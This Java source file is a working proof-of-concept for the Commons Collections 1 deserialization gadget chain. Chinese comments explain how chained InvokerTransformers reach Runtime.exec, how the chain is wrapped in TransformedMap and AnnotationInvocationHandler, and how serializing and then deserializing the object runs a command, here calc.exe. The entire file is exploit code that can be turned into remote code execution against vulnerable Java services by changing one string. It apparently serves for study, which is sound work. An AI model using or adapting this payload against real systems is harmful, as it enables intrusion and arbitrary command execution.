import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1T {
    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        HashMap<Object, Object> innerMap = new HashMap();
        innerMap.put("value", "hack");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        /*Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");*/

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object o = ctor.newInstance(SuppressWarnings.class, outerMap);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc1t.out"));
        outputStream.writeObject(o);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc1t.out"));
        inputStream.readObject();
    }
}
